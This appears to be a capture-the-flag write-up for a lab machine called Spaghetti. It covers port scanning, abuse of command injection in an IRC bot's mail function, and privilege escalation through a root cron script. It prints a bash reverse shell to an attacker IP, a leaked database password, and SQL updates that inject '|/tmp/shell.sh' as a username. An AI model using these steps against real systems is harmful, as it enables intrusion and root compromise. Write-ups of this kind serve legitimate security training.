# Spaghetti

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.208.160
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 11:31 +08
Nmap scan report for 192.168.208.160
Host is up (0.18s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
6667/tcp open  irc
8080/tcp open  http-proxy
```

IRC is open on this device, which is rather unusual. I did a detailed scan too:

```
$ nmap -p 25,80,6667,8080 -sC -sV --min-rate 3000 192.168.208.160 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 11:33 +08
Nmap scan report for 192.168.208.160
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: spaghetti.lan, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=spaghetti.lan
| Subject Alternative Name: DNS:spaghetti.lan
| Not valid before: 2021-03-09T11:39:07
|_Not valid after:  2031-03-07T11:39:07
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Spaghetti Mail
6667/tcp open  irc
| irc-info: 
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 2
|   lservers: 0
|   server: irc.spaghetti.lan
|   version: InspIRCd-3. irc.spaghetti.lan 
|   source ident: nmap
|   source host: 192.168.45.153
|_  error: Closing link: (nmap@192.168.45.153) [Client exited]
8080/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: Postfix Admin - 192.168.208.160:8080
|_Requested resource was login.php
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
```

Port 6667 is indeed running IRC, and it has some functionality.&#x20;

### Web Enum

Port 80 was entirely static.&#x20;

<figure><img src="../../../.gitbook/assets/image (3162).png" alt=""><figcaption></figcaption></figure>

Port 8080 was running a non-vulnerable version of Postfix, with a login page:

<figure><img src="../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

I had no credentials, so let's move on first.

### IRC -> Source Code -> RCE

I used `nc` to first enumerate the IRC server. Initially when connecting, it tells me that it cannot resolve my hostname, which we can fix by using `NICK`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1387).png" alt=""><figcaption></figcaption></figure>

It will then send this when we register a user:

```
USER ran213eqdw123 0 * ran213eqdw123
:irc.spaghetti.lan 001 patrick :Welcome to the Localnet IRC Network patrick!ran213eqdw@192.168.45.153
:irc.spaghetti.lan 002 patrick :Your host is irc.spaghetti.lan, running version InspIRCd-3
:irc.spaghetti.lan 003 patrick :This server was created 19:49:00 Feb 20 2023
:irc.spaghetti.lan 004 patrick irc.spaghetti.lan InspIRCd-3 iosw biklmnopstv :bklov
:irc.spaghetti.lan 005 patrick AWAYLEN=200 CASEMAPPING=rfc1459 CHANLIMIT=#:20 CHANMODES=b,k,l,imnpst CHANNELLEN=64 CHANTYPES=# ELIST=CMNTU HOSTLEN=64 KEYLEN=32 KICKLEN=255 LINELEN=512 MAXLIST=b:100 :are supported by this server
:irc.spaghetti.lan 005 patrick MAXTARGETS=20 MODES=20 NETWORK=Localnet NICKLEN=30 PREFIX=(ov)@+ SAFELIST STATUSMSG=@+ TOPICLEN=307 USERLEN=10 WHOX :are supported by this server
:irc.spaghetti.lan 251 patrick :There are 1 users and 0 invisible on 1 servers
:irc.spaghetti.lan 253 patrick 1 :unknown connections
:irc.spaghetti.lan 254 patrick 1 :channels formed
:irc.spaghetti.lan 255 patrick :I have 1 clients and 0 servers
:irc.spaghetti.lan 265 patrick :Current local users: 1  Max: 2
:irc.spaghetti.lan 266 patrick :Current global users: 1  Max: 2
:irc.spaghetti.lan 375 patrick :irc.spaghetti.lan message of the day
:irc.spaghetti.lan 372 patrick :- **************************************************
:irc.spaghetti.lan 372 patrick :- *             H    E    L    L    O              *
:irc.spaghetti.lan 372 patrick :- *  This is a private irc server. Please contact  *
:irc.spaghetti.lan 372 patrick :- *  the admin of the server for any questions or  *
:irc.spaghetti.lan 372 patrick :- *  issues.                                       *
:irc.spaghetti.lan 372 patrick :- **************************************************
:irc.spaghetti.lan 372 patrick :- *  The software was provided as a package of     *
:irc.spaghetti.lan 372 patrick :- *  Debian GNU/Linux <https://www.debian.org/>.   *
:irc.spaghetti.lan 372 patrick :- *  However, Debian has no control over this      *
:irc.spaghetti.lan 372 patrick :- *  server.                                       *
:irc.spaghetti.lan 372 patrick :- **************************************************
:irc.spaghetti.lan 372 patrick :- (The sysadmin possibly wants to edit </etc/inspircd/inspircd.motd>)
:irc.spaghetti.lan 376 patrick :End of message of the day.
```

Seems like we have a functioning IRC server here. I first listed the channels available:

```
LIST
:irc.spaghetti.lan 321 ran213eqdw123 Channel :Users Name
:irc.spaghetti.lan 322 ran213eqdw123 #mailAssistant 1 :[+nt] 
:irc.spaghetti.lan 323 ran213eqdw123 :End of channel list.
```

&#x20;I decided to use a GUI tool called `pidgin` to connect to the IRC server instead. We just have to add `irc.spaghetti.lan` to our `/etc/hosts` file. I used the same username as per what I nicked myself earlier.

<figure><img src="../../../.gitbook/assets/image (1374).png" alt=""><figcaption></figcaption></figure>

Then, I went to Conversations > Join a Chat and used `#mailAssistant` as the channel name to join. This dropped me within another chat group with a bot.

<figure><img src="../../../.gitbook/assets/image (1395).png" alt=""><figcaption></figcaption></figure>

We can open a separate DM with this bot:

<figure><img src="../../../.gitbook/assets/image (1410).png" alt=""><figcaption></figcaption></figure>

It drops a link to this Git repository:

{% embed url="https://github.com/9b61f9c243d4e87b2c95aa27b9e9e1db/PyBot" %}

Looks like we have some source code reviewing to do. There was one function within the `irc_bot.py` script that had the `send_message` function:

```python
def send_message (recipient, subject, body):
   cmd="echo {} | mail -s '{}' {}".format(body,subject, recipient)
   process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

regex = "^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}\$"

## at end of script, it shows how input is retrieved.
if "PRIVMSG" in text and "email" in text and "description" in text:
           email = text.split("email",1)[1].split(":",1)[1].split()[0]
           if check(email) == True:
              description = text.split("description",1)[1].split(":",1)[1]
              body = description.rstrip()
              subject = "email from {}".format(email)
              send_message (recipient, subject, body)
              irc.send(channel, user, "Email sent to administrator. Thank you.")
           else:
              irc.send(channel, user, "Please insert a valid mail address !")
```

The parameters are not sanitised at all. As such, we can attempt to chain commands using `&&` to inject commands into the script since it passes these arguments to shell commands.

<figure><img src="../../../.gitbook/assets/image (1443).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1424).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Cronjob -> MySQL Shell Injection

I ran `linpeas.sh` to enumerate, and it picked up on a cronjob running:

<figure><img src="../../../.gitbook/assets/image (1385).png" alt=""><figcaption></figcaption></figure>

Here's the script contents:

```bash
#!/bin/bash
#!/bin/bash
serv=inspircd
server=/home/hostmaster/irc_bot.py

   status="$(ps  -x | grep irc_bot.py |  awk 'NR==1{print $6}'| grep -v grep)"
   #echo $status
  if [ "$status" != "$server" ]; then
    nohup /home/hostmaster/irc_bot.py > /dev/null 2>&1 &
  #echo "start python"
 fi
```

Nothing much, it just keeps running the `python` script. I also ran `pspy64` to enumerate the processes the `root` user might be running:

```
2023/07/21 04:02:01 CMD: UID=0    PID=43727  | /bin/sh -c /opt/check_mailpass_expiration.sh 
2023/07/21 04:02:01 CMD: UID=0    PID=43731  | /bin/bash /opt/check_mailpass_expiration.sh
```

`root` is running a certain script. Here's the script contents:

```bash
#!/bin/bash
#Adapt to your setup

POSTFIX_DB="postfixadmin"
MYSQL_CREDENTIALS_FILE="/root/postfixadmin.my.cnf"

REPLY_ADDRESS=noreply@spaghetti.lan

# Change this list to change notification times and when ...
for INTERVAL in 30 14 7
do
    LOWER=$(( $INTERVAL - 1 ))

    QUERY="SELECT username,password_expiry FROM mailbox WHERE password_expiry > now() + interval $LOWER DAY AND password_expiry < NOW() + interval $INTERVAL DAY"

    mysql --defaults-extra-file="$MYSQL_CREDENTIALS_FILE" "$POSTFIX_DB" -B -e "$QUERY" | while read -a RESULT ; do
        echo -e "Dear User, \n Your password will expire on ${RESULT[1]}" | mail -s "Password 30 days before expiration notication" -r $REPLY_ADDRESS  ${RESULT[0]}
    done

done
```

The script basically sends emails to users. However, I noticed that the parameters from the MySQL database aren't sanitised at all, and passed directly into the `mail` command. This opens up a chance for injecting some commands. `${RESULT[0]}` is the parameter that is vulnerable, and it is the `username` parameter from the database.&#x20;

To exploit this, we can first put a reverse shell script within the host and `chmod` it:

```bash
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.153/21 0>&1
```

Now, we need to find SQL credentials, which might be located within the Postfix files based on the name of the file `root` uses. I found it within the `/var/www/postfixadmin/config.local.php` file:

```
hostmaster@spaghetti:/var/www/postfixadmin$ cat config.local.php 
<?php
$CONF['configured'] = true;
$CONF['password_expiration'] = 'YES';
$CONF['database_type'] = 'mysqli';
$CONF['database_host'] = 'localhost';
$CONF['database_user'] = 'postfixadmin';
$CONF['database_password'] = 'P4s8vV0r6';
$CONF['database_name'] = 'postfixadmin';
<TRUNCATED>
```

From here, we can login to the database and use the `postfixadmin` database.&#x20;

```
hostmaster@spaghetti:/var/www/postfixadmin$ mysql -u postfixadmin -pP4s8vV0r6
mysql: [Warning] Using a password on the command line interface can be insecure.             
Welcome to the MySQL monitor.  Commands end with ; or \g.                                    
Your MySQL connection id is 139
Server version: 8.0.23-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use postfixadmin;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

The script uses the `mailbox` table, so we can update the entries within it:

```
mysql> update mailbox set username =' |/tmp/shell.sh';
Query OK, 1 row affected (0.02 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> update mailbox set password_expiry = (select now() + interval 7 day);
Query OK, 1 row affected (0.01 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

Afterwards, we can just wait for `root` to execute it and give us a reverse shell:

<figure><img src="../../../.gitbook/assets/image (1386).png" alt=""><figcaption></figcaption></figure>
